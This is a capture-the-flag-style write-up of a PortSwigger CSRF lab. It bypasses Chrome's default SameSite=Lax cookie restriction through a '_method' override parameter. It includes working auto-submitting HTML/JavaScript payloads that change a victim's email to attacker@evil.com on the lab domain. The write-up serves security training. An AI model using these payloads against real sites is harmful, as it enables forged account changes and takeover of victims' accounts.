# SameSite Lax bypass via method override

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override), you'll learn: SameSite Lax bypass via method override! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab's change email function is vulnerable to CSRF. To solve the lab, perform a [CSRF attack](https://portswigger.net/web-security/csrf) that changes the victim's email address. You should use the provided exploit server to host your attack.

You can log in to your own account using the following credentials: `wiener:peter`

> Note:
> The default [SameSite](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions) restrictions differ between browsers. As the victim uses Chrome, we recommend also using Chrome (or Burp's built-in Chromium browser) to test your exploit.

## Exploitation

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-7/images/Pasted%20image%2020230113171113.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-7/images/Pasted%20image%2020230113171131.png)

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-7/images/Pasted%20image%2020230113171238.png)

**When we successfully logged in, it'll set a new session cookie for us:**
```
Set-Cookie: session=rIvG2u8btj2TaB0q6tdZptKTItB5d0is; Expires=Sat, 14 Jan 2023 09:11:15 UTC; Secure; HttpOnly
```

However, **it doesn't have a `SameSite` attribute.**

In the lab's background, it said:

> ... The victim uses Chrome.

In Chrome, **it'll automatically apply `Lax` restrictions by default**. This means that the cookie is only sent in cross-site requests that meet specific criteria, even though the developers never configured this behavior.

**Also, let's view the source page in `/my-account`:**
```html
<h1>My Account</h1>
<div id=account-content>
    <p>Your username is: wiener</p>
    <p>Your email is: wiener@normal-user.net</p>
    <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
        <label>Email</label>
        <input required type="email" name="email" value="">
        <button class='button' type='submit'> Update email </button>
    </form>
</div>
```

As you can see, **the form doesn't include a CSRF token**, which helps to prevent CSRF (Cross-Site Request Forgery) attack.

Now, we can try to update our email address:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-7/images/Pasted%20image%2020230113171659.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-7/images/Pasted%20image%2020230113171714.png)

When we clicked the "Update email" button, **it'll send a POST request to `/my-account/change-email`, with parameter `email`.**

In order to perform CSRF attack, we need dig deeper about `Lax` SameSite restriction.

- `Lax` SameSite restriction:

**Browsers will send the cookie in cross-site requests, but only if both of the following conditions are met:**

1. The request uses the GET method.
2. The request resulted from a top-level navigation by the user, such as clicking on a link.

This means that the cookie is not included in cross-site POST requests, for example. As POST requests are generally used to perform actions that modify data or state (at least according to best practice), they are much more likely to be the target of CSRF attacks.

Likewise, the cookie is not included in background requests, such as those initiated by scripts, iframes, or references to images and other resources.

**Armed with above information, we can craft our CSRF payload:**
```html
<html>
    <head>
        <title>CSRF-7</title>
    </head>
    <body>
        <script type="text/javascript">
            document.location = 'https://0a9e00e10408d338c1928be6001f00ff.web-security-academy.net/my-account/change-email?email=attacker@evil.com';
        </script>
    </body>
</html>
```

This HTML payload will redirect to `/my-account/change-email` upon visit, which the browser will send a GET request to that endpoint, with parameter `email`. This could happen because servers aren't always fussy about whether they receive a GET or POST request to a given endpoint, even those that are expecting a form submission.

**Then, go to the exploit server to host the payload, and test it:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-7/images/Pasted%20image%2020230113172742.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-7/images/Pasted%20image%2020230113172752.png)

Hmm... `"Method Not Allowed"`.

Now, even if an ordinary GET request isn't allowed, **some frameworks provide ways of overriding the method specified in the request line**. For example, Symfony supports the `_method` parameter in forms, which takes precedence over the normal method for routing purposes:

```html
<html>
    <head>
        <title>CSRF-7</title>
    </head>
    <body>
        <form action="https://0a9e00e10408d338c1928be6001f00ff.web-security-academy.net/my-account/change-email" method="GET">
            <input type="hidden" name="_method" value="POST">
            <input type="hidden" name="email" value="attacker@evil.com">
        </form>
        <script>
            document.getElementsByTagName('form')[0].submit();
        </script>
    </body>
</html>
```

This will the form will still send a GET request to `/my-account/change-email`, however the `_method` parameter will override the method to POST request.

> Note: The JavaScript is to automatically submit the form.

**Let's host the payload and test it again:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-7/images/Pasted%20image%2020230113173725.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-7/images/Pasted%20image%2020230113173735.png)

It worked!

**Let's send the payload to victim:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-7/images/Pasted%20image%2020230113173759.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-7/images/Pasted%20image%2020230113173805.png)

Nice!

# What we've learned:

1. SameSite Lax bypass via method override